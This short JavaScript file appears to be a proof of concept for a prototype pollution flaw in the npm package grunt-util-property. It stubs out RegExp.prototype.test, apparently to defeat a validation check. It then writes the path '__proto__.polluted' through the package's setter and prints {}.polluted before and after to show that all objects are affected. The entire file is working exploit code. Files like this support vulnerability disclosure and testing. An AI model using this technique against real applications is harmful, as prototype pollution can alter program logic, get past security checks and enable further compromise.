RegExp.prototype.test = () => false;
const grunt = require('grunt');
const a = require('grunt-util-property');
console.log({}.polluted);
let b = a(grunt);
b.call({}, '__proto__.polluted', 'yes');
console.log({}.polluted);